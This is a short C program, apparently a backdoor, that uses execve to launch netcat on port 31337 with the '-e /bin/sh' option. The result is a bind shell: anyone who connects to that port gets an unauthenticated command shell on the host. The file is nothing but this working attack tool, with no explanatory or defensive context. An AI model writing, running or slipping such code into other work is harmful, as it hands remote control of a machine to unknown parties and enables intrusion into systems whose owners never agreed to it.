#include <unistd.h>
int main(){
  char *final[1]={NULL};
  char *argumentos[6]={"/bin/nc",
                      "-lp",
                      "31337",
                      "-e",
                      "/bin/sh",
                      NULL
  };
  execve("/bin/nc", argumentos, final);
  return 0;
}
